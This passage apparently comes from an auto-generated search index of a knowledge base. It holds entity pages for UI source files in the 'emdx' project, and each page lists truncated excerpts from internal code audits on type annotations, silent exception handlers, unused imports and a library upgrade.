Recommendation `activity... <ul> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 1. Activity Items \u2014 <code>doc_db: Any</code> (6 occurrences)</p> <p>Location: <code>emdx/ui/activity/activity_items.py</code> (lines 51, 56, 86, 122, 179, 221, 285, 289, 330, 393, 464, 468)</p> </li> <li> <p>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers</p> <p>...ess</p> </li> <li><code>emdx/ui/activity/activity_data.py</code> - ImportError for optional services</li> <li><code>emdx/ui/activity/activity_items.py</code> - Added logger, debug logging for load failures</li> <li><code>emdx/ui/cascade/document_list.py</code> - ValueError/IndexError on row data parsing</li> <li> <p>`emdx/ui/command_palette/palett...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 6. DUPLICATE IMPORTS (Code Quality)</p> <p>...et_subprocess_env`</p> </li> <li><code>emdx/services/unified_executor.py</code> - Duplicates: <code>select</code></li> <li><code>emdx/ui/activity/activity_items.py</code> - Duplicates: <code>groups</code></li> <li><code>emdx/ui/activity/activity_tree.py</code> - Duplicates: <code>format_time_ago</code></li> <li><code>emdx/ui/activity/activity_view.py</code> - Duplicates: <code>LiveLogWriter</code></li> <li> <p>`...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...d | | <code>emdx/ui/activity_browser.py</code> | 101-103 | Widget focus silently ignored | | <code>emdx/ui/activity/activity_items.py</code> | 218-219 | Children loading silently ignored | | <code>emdx/ui/activity/activity_items.py</code> | 494-495 | Log read silently ignored | | <code>emdx/ui/activity/activity_view.py</code>...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...ui/cascade/cascade_view.py<code>| 259-260 | Log widget query silently fails | LOW | |</code>emdx/ui/activity/activity_items.py<code>| 218-219 | Child generation silently fails | MEDIUM | |</code>emdx/ui/activity/activity_items.py<code>| 494-495 | Log content read silently fails | MEDIUM | |</code>emdx/ui/acti...</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Code Locations Summary</p> <p>...activity_data.py<code>| 244-302 | Transforms rows to ActivityItems | | Item display |</code>emdx/ui/activity/activity_items.py<code>| 433-498 | AgentExecutionItem class | | Preview rendering |</code>emdx/ui/activity/activity_view.py` | 473-517 | Shows doc content or log |...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 1. wf_db Parameter \u2014 RUNTIME-BREAKING (12 hits)</p> <p>File: <code>emdx/ui/activity/activity_items.py</code></p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Files Modified</p> <ol> <li>emdx/ui/activity/activity_items.py \u2014 1 change</li> </ol> </li> <li>Removed Cursor icon branch from <code>type_icon</code> property</li> </ul>"},{"location":"entities/emdxuiactivityactivityitemspy/#any-type-removal-analysis-15","title":"Any Type Removal Analysis [1/5]","text":""},{"location":"entities/emdxuiactivityactivityitemspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>initial_doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>grouplistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>emdx/ui/cascade/document_list.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>emdx/ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>emdx/ui/log_browser_display.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>emdx/ui/activity/activity_data.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.3)</li> <li><code>stage_summary_bar.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>emdx/ui/activity_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/emdxuiactivityactivityviewpy/","title":"emdx/ui/activity/activity_view.py","text":"<p>Type: tech_term | Mentioned in: 18 documents | First seen: 2026-01-13</p>"},{"location":"entities/emdxuiactivityactivityviewpy/#documents-18","title":"Documents (18)","text":"<ul> <li>#6840 Delegate: TUI-24 (Issue #1241): Update TUI browser with doc_type badge [2/2]   Section: What was done (Issue #1241): <p>...` parameter</p> </li> <li><code>emdx/ui/activity/activity_table.py</code> \u2014 Wiki badge in title column</li> <li><code>emdx/ui/activity/activity_view.py</code> \u2014 Filter reactive, <code>w</code> keybinding, status bar indicator</li> <li><code>emdx/ui/activity_browser.py</code> \u2014 Help bar updated with <code>w</code> hint</li> <li> <p><code>tests/test_activity_doc_type.py</code> \u2014 14 ne...</p> </li> <li> <p>#6757 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</p> </li> </ul>"},{"location":"entities/emdxuiactivityactivityviewpy/#un-22","title":"Un [2/2]","text":"<p>Section: Phase 2 of Unified Dashboard Data Model (Issue #6709)</p> <ol> <li><code>emdx/ui/activity/activity_view.py</code> \u2014 Two independent changes:</li> <li>Part A: Added <code>d</code>/<code>a</code>/<code>b</code> keybindings to mark tasks as done/active/blocked, guarded to only fire on <code>item_type == \"task\"</code>. Upd...</li> </ol> <ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...s.py<code>| 84, 162-166, 172, 218, 298-299 | \u2705\ud83d\udccb\ud83c\udff7\ufe0f\ud83d\udcca\ud83d\udcdd\u274c | Activity view status icons | |</code>emdx/ui/activity/activity_view.py<code>| 423, 576, 744, 764 | \u26a0\ufe0f\ud83d\udccb\ud83d\udcdd | Activity view display | |</code>emdx/ui/activity/group_picker.py` | 210-214 | \ud83d\udccb\ud83c\udff7\ufe0f | Group picker type icons |</p> </li> <li> <p>#6547 Delegate: Review PR #653 using 'gh pr view 653' and 'gh pr diff 653'.  [1/6]   Section: Code Changes Reviewed</p> </li> <li> <p>Added <code>on_activity_tree_double_clicked()</code> handler that calls <code>action_fullscreen()</code></p> </li> <li> <p>#6537 Delegate: Document #6526 (Gameplan: Single-click highlights, double-cl   Section: Files Modified</p> <ul> <li><code>emdx/ui/activity/activity_tree.py</code> \u2014 click override, double-click detection, DoubleClicked message</li> </ul> </li> <li> <p><code>emdx/ui/activity/activity_view.py</code> \u2014 DoubleClicked handler</p> </li> <li> <p>#6526 Gameplan: Single-click highlights, double-click opens fullscreen   Section: Bug: Single click in Activity TUI opens fullscreen</p> </li> <li> <p>#6510 None Type Analysis [7/7]</p> <p><code>emdx/ui/browser_container.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 82 <code>initial_theme: str \\| None = None</code> NECESSARY - CLI may not provide theme 86 `self.container_widget: BrowserContai... <ul> <li>#6491 Any Type Removal Analysis [1/5] <p>Lines 464, 468: <code>AgentExecutionItem</code> methods</p> </li> </ul> <p>Same <code>DocumentServiceProtocol | None</code> pattern. ---</p>"},{"location":"entities/emdxuiactivityactivityviewpy/#emdxuiactivityactivity_viewpy_1","title":"<code>emdx/ui/activity/activity_view.py</code>","text":""},{"location":"entities/emdxuiactivityactivityviewpy/#root-cause","title":"Root Cause","text":"<p><code>emdx/ui/activity/activity_view.py</code> line 956-958:</p>"},{"location":"entities/emdxuiactivityactivityviewpy/#file-emdxuiactivityactivity_viewpy","title":"File: <code>emdx/ui/activity/activity_view.py</code>","text":""},{"location":"entities/emdxuiactivityactivityviewpy/#1-line-16-import","title":"1. Line 16: Import","text":"<p>Current:</p> <pre><code>from typing import Any\n</code></pre> <p>Recommended: Keep the impor...</p> <ul> <li>#6488 Any Type Removal Analysis [1/5] </li> </ul>"},{"location":"entities/emdxuiactivityactivityviewpy/#occurrence-8-group-dictstr-any-and-execution-dictstr-any-fields","title":"Occurrence 8: <code>group: dict[str, Any]</code> and <code>execution: dict[str, Any]</code> fields","text":"<p>Current signatures (lines 302, 435):</p> <pre><code>group: dict[str, Any] = field(default_factory=dict)\nexecution: dict[str, Any] = field(default_factory=dict)\n</code></pre> <p>...</p> <ul> <li>#6342 Delegate: Document #6330 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/emdxuiactivityactivityviewpy/#emdx-arc-212","title":"EMDX Arc [2/12]","text":"<p>Section: Changes Made</p> <p>.../commands/delegate.py<code>(4 locations) - create_worktree_simple, cleanup_worktree -</code>emdx/ui/activity/activity_view.py<code>- get_git_project -</code>emdx/ui/document_browser.py<code>- get_git_project -</code>emdx/ui/presenters/document_browser_presenter.py<code>- get_git_project -</code>tests/test_utils.py` -...</p> <ul> <li>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority) <p>...mdx/ui/activity/activity_data.py:8<code>- unused imports:</code>Any<code>,</code>Dict<code>,</code>Optional`</p> </li> <li><code>emdx/ui/activity/activity_view.py:16</code> - unused imports: <code>Any</code>, <code>Dict</code>, <code>Tuple</code></li> <li><code>emdx/ui/activity/group_picker.py:9,13</code> - unused imports: <code>Callable</code>, <code>Horizontal</code></li> <li> <p><code>emdx/ui/activity_browser.py:7</code> -...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...| <code>emdx/ui/activity/activity_items.py</code> | 494-495 | Log read silently ignored | | <code>emdx/ui/activity/activity_view.py</code> | 276-277 | Returns None on any error | | <code>emdx/ui/activity/activity_view.py</code> | 432-433 | Markdown render silently falls back | | <code>emdx/ui/cascade/cascade_view.py</code>...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...ivity/activity_items.py<code>| 494-495 | Log content read silently fails | MEDIUM | |</code>emdx/ui/activity/activity_view.py<code>| 276-277 | Tree cursor access silently fails | LOW | |</code>emdx/ui/activity/activity_view.py<code>| 432-434 | Markdown render fallback silently fails | LOW | |</code>emdx/ui/t...</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Code Locations Summary</p> <p>...y/activity_items.py<code>| 433-498 | AgentExecutionItem class | | Preview rendering |</code>emdx/ui/activity/activity_view.py` | 473-517 | Shows doc content or log |...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Files Examined</p> <p>...+ preview + edit | | <code>emdx/ui/activity_browser.py</code> | Wrapper for ActivityView | | <code>emdx/ui/activity/activity_view.py</code> | Mission Control \u2014 shows agents, cascades, groups | | <code>emdx/ui/activity/activity_data.py</code> | Data loader \u2014 loads groups, docs, cascades, agents (NOT tasks) | | `emd...</p> </li> <li> <p>#4759 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Key Files Reference</p> File Lines Purpose <code>emdx/ui/activity/activity_view.py</code> 1519 Main display logic <code>emdx/workflows/database.py</code> Modified Zombie cleanup, status clearing <code>emdx/workflows/executor.py</code> Modified Document var... </li> <li> <p>#4843 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Common Themes Across All Tracks</p> <p>...n Location &amp; Algorithm All analyses correctly identified:</p> </li> <li>Primary location: <code>emdx/ui/activity/activity_view.py:688-705</code></li> <li>Bar width: 10 characters (optimized for 4-5 task workflows)</li> <li>Precision: 1/8th character using Unicode fractional blocks (<code>\u258f\u258e\u258d\u258c\u258b\u258a\u2589\u2588</code>)</li> <li> <p>**Display...</p> </li> <li> <p>#4746 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Executive Summary</p> <p>...solidates four parallel performance analyses of the EMDX Activity View component (<code>emdx/ui/activity/activity_view.py</code>, ~1,516 lines). All analyses converge on a critical finding: the N+1 database query pattern causing 300-800+ queries every 5 seconds during periodic refresh...</p> </li> </ul>"},{"location":"entities/emdxuiactivityactivityviewpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/activity_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>emdx/ui/activity/group_picker.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>nodeselected</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>doubleclicked</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>tests/test_activity_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>resolved contradictions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>emdx/ui/activity/activity_tree.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.3)</li> <li><code>activitytree</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> </ul>"},{"location":"entities/emdxuibrowsercontainerpy/","title":"emdx/ui/browser_container.py","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxuibrowsercontainerpy/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...letion message | | <code>emdx/ui/themes.py</code> | 262, 265-266 | \ud83c\udf19\u2600\ufe0f | Theme indicator | | <code>emdx/ui/browser_container.py</code> | 478 | \ud83c\udf19\u2600\ufe0f | Theme toggle indicator | | <code>emdx/ui/gui.py</code> | 27 | \u274c | Error display | | <code>emdx/ui/command_palette/palette_presenter.py</code> | 215 | \ud83c\udff7\ufe0f | Tag search result...</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: 1. Changed <code>**kwargs: Any</code> to <code>**kwargs: object</code> in UI <code>__init__</code> methods</p> <p>Files modified:</p> </li> <li><code>emdx/ui/cascade/cascade_view.py</code> - <code>CascadeView.__init__</code></li> <li><code>emdx/ui/browser_container.py</code> - <code>BrowserContainer.__init__</code> and <code>exit</code> methods</li> <li><code>emdx/ui/text_areas.py</code> - <code>SelectionTextArea.__init__</code> and <code>VimEditTextArea.__init__</code></li> <li> <p>`emdx/ui/search/search_sc...</p> </li> <li> <p>#6510 None Type Analysis [7/7]</p> <p><code>emdx/ui/command_palette/palette_commands.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 31 <code>action: Callable \\| None = None</code> NECESSARY - Some commands may not have direct actions 33 `shortcu... <ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority </li> <li><code>emdx/ui/browser_container.py</code> (7 occurrences)</li> <li><code>emdx/ui/text_areas.py</code> (5 occurrences)</li> <li><code>emdx/ui/command_palette/palette_presenter.py</code> (4 occurrences)</li> <li> <p><code>emdx/commands/compact.py</code> (6 occurrenc...</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]</p> </li> </ul>"},{"location":"entities/emdxuibrowsercontainerpy/#should-fix-improves-clarity","title":"Should Fix (improves clarity)","text":""},{"location":"entities/emdxuibrowsercontainerpy/#file-by-file-analysis","title":"File-by-File Analysis","text":""},{"location":"entities/emdxuibrowsercontainerpy/#1-emdxuibrowser_containerpy","title":"1. <code>emdx/ui/browser_container.py</code>","text":"Line Current Signature Recommended Type Rationale 7 <code>from typing import Any</code> Keep for specific uses Mo... <ul> <li>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.1 Static Widget <code>renderable</code> \u2192 <code>content</code> (v6.0.0) <p>...tatus bars</p> </li> <li><code>emdx/ui/search/search_screen.py</code> - Uses <code>Static</code> for mode buttons</li> <li><code>emdx/ui/browser_container.py</code> - Uses <code>Static</code> for fallback error messages</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> - Uses <code>Static</code> for status/navigation</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...le<code>,</code>Horizontal`</p> </li> <li><code>emdx/ui/activity_browser.py:7</code> - unused import: <code>Vertical</code></li> <li><code>emdx/ui/browser_container.py:11</code> - unused import: <code>Vertical</code></li> <li><code>emdx/ui/cascade/__init__.py:3</code> - unused import: <code>CascadeBrowser</code></li> <li> <p><code>emdx/ui/cascade/cascade_browser.py:12</code> - unused import: `updat...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Files Examined</p> File Purpose <code>emdx/ui/browser_container.py</code> Main TUI container, switches between 4 browsers <code>emdx/ui/document_browser.py</code> Document list + preview + edit <code>emdx/ui/activity_browser.py</code> Wrapper for... </li> </ul>"},{"location":"entities/emdxuibrowsercontainerpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/ui/log_browser_navigation.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.4)</li> <li><code>emdx/ui/log_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.4)</li> <li><code>emdx/ui/themes.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>emdx/ui/task_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>9.</code>emdx/ui/task_view.py` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>taginfo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>query_one</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/emdxuicascadecascadeviewpy/","title":"emdx/ui/cascade/cascade_view.py","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxuicascadecascadeviewpy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6518 Any removal Phase 1: Quick wins   Section: 1. Changed <code>**kwargs: Any</code> to <code>**kwargs: object</code> in UI <code>__init__</code> methods <p>Files modified:</p> </li> <li><code>emdx/ui/cascade/cascade_view.py</code> - <code>CascadeView.__init__</code></li> <li><code>emdx/ui/browser_container.py</code> - <code>BrowserContainer.__init__</code> and <code>exit</code> methods</li> <li> <p><code>emdx/ui/text_areas.py</code> - <code>SelectionTextArea.__init__</code>...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: Files Changed</p> <ol> <li><code>emdx/ui/types.py</code> (NEW)</li> </ol> </li> <li><code>emdx/ui/activity/activity_items.py</code> (MODIFIED)</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> (MODIFIED)</p> </li> <li> <p>#6510 None Type Analysis [7/7]</p> </li> </ul>"},{"location":"entities/emdxuicascadecascadeviewpy/#unnecessary-none-annotations","title":"UNNECESSARY <code>| None</code> Annotations","text":""},{"location":"entities/emdxuicascadecascadeviewpy/#1-emdxuicascadecascade_viewpy","title":"1. <code>emdx/ui/cascade/cascade_view.py</code>","text":"Line Annotation Reason Unnecessary 91 <code>self.summary: StageSummaryBar \\| None = None</code> Assigned in <code>compose()</code> b... <ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority <p>...-&gt; SentenceTransformer`)</p> </li> <li><code>emdx/ui/activity/activity_items.py</code> (8 occurrences)</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> (12 occurrences)</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]</p> <p>Line 116-117: Group list types</p> </li> </ul> <p>Current:</p> <pre><code>self.groups: list[dict[str, Any]] = []\nself.filtered_groups: list[dict[str, Any]] = []\n</code></pre> <p>Recommended: Create or reuse a TypedDict:</p> <pre><code>class GroupListItem(TypedDict):\n    id: int\n   ...\n\n- **#6488** Any Type Removal Analysis [1/5]\n  &gt; ```python\nclass GroupListItem(TypedDict):\n    id: int\n    name: str\n    group_type: str\n    doc_count: int\n</code></pre> <p>Replace with:</p> <pre><code>self.groups: list[GroupListItem] = []\nself.filtered_groups: list[GroupListItem] = []\n</code></pre> <p>Why: The code ac...</p> <ul> <li>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 1.1 Static Widget <code>renderable</code> \u2192 <code>content</code> (v6.0.0) <p>...ns</p> </li> <li><code>emdx/ui/browser_container.py</code> - Uses <code>Static</code> for fallback error messages</li> <li> <p><code>emdx/ui/cascade/cascade_view.py</code> - Uses <code>Static</code> for status/navigation</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 6. DUPLICATE IMPORTS (Code Quality)</p> <p>...riter`</p> </li> <li><code>emdx/ui/search/search_screen.py</code> - Duplicates: <code>DocumentPreviewModal</code></li> <li><code>emdx/ui/cascade/cascade_view.py</code> - Duplicates: <code>ScrollableContainer</code>, <code>RichLog</code>, <code>LiveLogWriter</code></li> <li> <p><code>emdx/ui/command_palette/palette_presenter.py</code> - Duplicates: <code>SearchQuery</code></p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...ui/activity/activity_view.py<code>| 432-433 | Markdown render silently falls back | |</code>emdx/ui/cascade/cascade_view.py<code>| 196-197 | Time parsing returns \"?\" | |</code>emdx/ui/cascade/cascade_view.py<code>| 227-228 | Widget query silently returns | |</code>emdx/ui/cascade/cascade_view.py` | 259-260...</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...mdx/ui/search/search_screen.py<code>| 534-535 | Key handling silently fails | LOW | |</code>emdx/ui/cascade/cascade_view.py<code>| 196-197 | Time formatting silently fails | LOW | |</code>emdx/ui/cascade/cascade_view.py<code>| 227-228 | Widget query silently fails | LOW | |</code>emdx/ui/cascade/cascade_vi...</p> </li> </ul>"},{"location":"entities/emdxuicascadecascadeviewpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>pipeline_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>pipeline_display_name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>initial_doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>grouplistitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>type safety benefits</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>emdx/ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>emdx/ui/modals.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.9)</li> <li><code>stage_summary_bar.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>emdx/ui/activity/group_picker.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>cascaderundict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/emdxuicommandpalettepalettepresenterpy/","title":"emdx/ui/command_palette/palette_presenter.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxuicommandpalettepalettepresenterpy/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...| \ud83c\udf19\u2600\ufe0f | Theme toggle indicator | | <code>emdx/ui/gui.py</code> | 27 | \u274c | Error display | | <code>emdx/ui/command_palette/palette_presenter.py</code> | 215 | \ud83c\udff7\ufe0f | Tag search result icon | | <code>emdx/ui/log_browser.py</code> | 197, 210, 212, 217, 237-238, 253, 317, 336 | \ud83d\udccb\u2705\u274c | Log browser UI | | `emdx/ui/log_browser_displa...</p> </li> <li> <p>#6514 Any removal Phase 3: Protocols</p> <p>Updated <code>emdx/ui/vim_editor.py</code></p> </li> <li> <p><code>VimEditor.__init__</code>: Changed <code>app_instance: Any</code> to <code>app_instance: VimEditorHost</code></p> </li> <li><code>**kwargs: Any</code> to <code>**kwargs: object</code> (standard pattern for widget kwargs passed to parent)</li> </ul>"},{"location":"entities/emdxuicommandpalettepalettepresenterpy/#4-updated-emdxuicommand_palet","title":"4. Updated `emdx/ui/command_palet...","text":"<ul> <li>#6510 None Type Analysis [7/7] <p><code>emdx/ui/search/search_presenter.py</code></p> 